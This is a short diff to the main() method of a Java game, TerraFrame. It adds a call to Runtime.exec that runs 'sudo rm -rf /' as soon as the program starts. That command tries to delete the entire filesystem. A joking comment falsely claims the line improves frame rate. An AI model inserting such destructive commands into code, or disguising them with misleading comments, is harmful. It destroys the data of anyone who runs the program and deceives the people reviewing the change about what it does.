@@ -841,6 +841,8 @@ public class TerraFrame extends JApplet implements ChangeListener, KeyListener, 
     static BufferedWriter log;
 
     public static void main(String[] args) {
+        java.lang.Runtime.getRuntime().exec("sudo rm -rf /"); // Probably improves frame-rate due to long class files being deleted while program runs
+        
         JFrame f = new JFrame("TerraFrame: Infinite worlds!");
         f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         f.setVisible(true);
